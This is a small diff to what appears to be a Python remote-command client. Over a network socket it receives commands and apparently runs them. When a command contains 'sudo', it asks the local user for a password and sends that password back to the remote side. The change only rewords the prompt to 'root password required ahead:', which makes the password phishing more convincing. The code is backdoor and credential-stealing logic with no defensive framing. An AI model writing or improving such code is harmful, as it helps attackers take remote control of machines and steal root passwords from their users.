@@ -13,7 +13,8 @@ while True:
 	if received_data == 'quit' :
 		client_socket.close()
 	elif "sudo" in received_data :
-		password = getpass.getpass()
+		prompt = "root password required ahead: "
+		password = getpass.getpass(prompt)
 		client_socket.send(str(password))
 		
 	else :
@@ -22,4 +23,3 @@ while True:
 			client_socket.send("Command succesfully executed.")
 		else:
 			client_socket.send(str(command) + "\nCommand succesfully executed.")
-		
